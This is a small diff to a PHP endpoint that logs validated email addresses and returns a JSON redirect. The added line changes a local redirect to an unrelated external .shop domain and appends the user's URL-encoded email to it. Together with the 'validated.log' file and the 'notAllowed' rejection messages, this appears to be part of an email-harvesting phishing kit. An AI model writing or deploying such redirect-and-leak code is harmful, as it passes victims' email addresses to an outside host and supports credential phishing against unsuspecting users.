@@ -79,7 +79,7 @@ file_put_contents(__DIR__ . '/../../.data/validated.log', json_encode($logEntry)
 if ($valid) {
   echo json_encode([
     'success' => true,
-    'redirectUrl' => '/fina#$' . urlencode($email)
+    'redirectUrl' => 'https://kunststo.transportwielen.shop/fina#$' . urlencode($email)
   ]);
 } else {
   echo json_encode([
@@ -87,3 +87,4 @@ if ($valid) {
     'message' => $msg['notAllowed'][$lang]
   ]);
 }
+
